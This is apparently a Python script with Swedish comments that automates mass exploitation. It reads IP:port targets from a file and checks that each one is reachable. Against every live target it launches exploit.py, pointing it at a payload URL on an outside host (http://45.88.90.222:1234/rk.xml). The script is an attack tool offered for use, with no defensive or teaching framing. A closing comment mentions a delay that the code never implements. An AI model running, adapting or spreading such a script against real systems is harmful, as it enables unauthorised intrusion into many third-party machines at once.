import subprocess
import socket
import time

# Funktion för att testa anslutningen till en IP-adress och port
def test_connection(ip, port):
    try:
        # Försök ansluta till IP-adressen och porten
        start_time = time.time()
        sock = socket.create_connection((ip, int(port)), timeout=5)
        end_time = time.time()
        print(f"Anslutning till {ip}:{port} lyckades på {end_time - start_time:.2f} sekunder.")
        sock.close()
        return True
    except Exception as e:
        print(f"Anslutning till {ip}:{port} misslyckades: {e}")
        return False

# Läs innehållet i test.txt och dela upp raderna
with open('test.txt', 'r') as file:
    ip_addresses = file.readlines()

print("Antal IP-adresser i test.txt:", len(ip_addresses))  # Debug-utskrift

# Loopa igenom varje rad och kör exploit.py med IP-adressen och porten
for idx, ip_address in enumerate(ip_addresses):
    print(f"\nBehandlar IP-adress {idx + 1}: {ip_address.strip()}")  # Debug-utskrift
    # Dela upp IP-adress och port
    ip, port = ip_address.strip().split(':')

    # Testa anslutningen
    if test_connection(ip, port):
        # Om anslutningen lyckades, kör exploit.py
        print("Anslutningen lyckades. Kör exploit.py...")
        command = ['python', 'exploit.py', '-i', ip, '-p', port, '-u', 'http://45.88.90.222:1234/rk.xml']
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Vänta på att processen ska avslutas och få utskrifterna
        stdout, stderr = process.communicate()

        # Skriv ut utskrifterna till terminalen
        print("\nStandard output:")
        print(stdout.decode())
        print("Standard error:")
        print(stderr.decode())
    else:
        # Om anslutningen misslyckades eller tog för lång tid, fortsätt till nästa IP-adress
        print("Hoppar till nästa IP-adress...")

    # Fördröjning på 5 sekunder mellan varje anslutningsförsök
    
